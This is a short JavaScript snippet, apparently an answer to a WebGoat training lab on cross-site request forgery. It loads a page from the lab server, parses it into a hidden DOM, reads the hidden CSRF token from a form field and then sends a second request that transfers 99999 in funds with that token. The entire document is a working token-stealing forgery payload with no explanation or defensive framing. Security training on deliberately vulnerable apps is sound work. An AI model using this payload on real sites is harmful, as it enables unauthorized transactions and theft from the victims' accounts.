// synchronous GET request
var r = new XMLHttpRequest();
r.open("GET", "http://10.0.2.4:8080/WebGoat/attack?menu=900&Screen=803158781&transferFunds=main", false);
r.send(null);

// create dummy DOM
var d = document.createElement('html')
d.innerHTML = r.responseText

// manipulate dummy DOM like normal
// this code grabs a hidden token from a form
t = d.getElementsByTagName("input")[1].value

var r = new XMLHttpRequest(); 
r.open("GET", "http://10.0.2.4:8080/WebGoat/attack?menu=900&Screen=803158781&transferFunds=99999&CSRFToken=" + t, false);
r.send(null);